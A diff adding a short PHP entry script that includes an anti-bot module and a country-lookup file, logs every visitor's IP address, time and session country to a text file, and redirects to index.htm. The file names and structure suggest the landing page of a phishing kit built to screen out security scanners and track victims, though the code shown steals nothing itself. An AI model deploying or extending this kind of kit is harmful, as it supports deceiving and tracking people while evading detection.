@@ -1,0 +1,20 @@
+<?php
+ob_start();
+session_start();
+include 'antibots.php';
+include('dznoob-country.php');
+$ip = $_SERVER['REMOTE_ADDR'];
+date_default_timezone_set('GMT');
+$date = date('Y-m-d H:i:s');
+$iP_adress = $_SERVER['REMOTE_ADDR'];
+$ip0s = fopen("ip0.txt", 'a');
+
+$sampleLine = "\n" . $iP_adress . " " . $date . " " . $_SESSION['AYCOUNT'];
+fwrite($ip0s, $sampleLine);
+
+ header("location: index.htm"); 
+
+
+
+
+?>
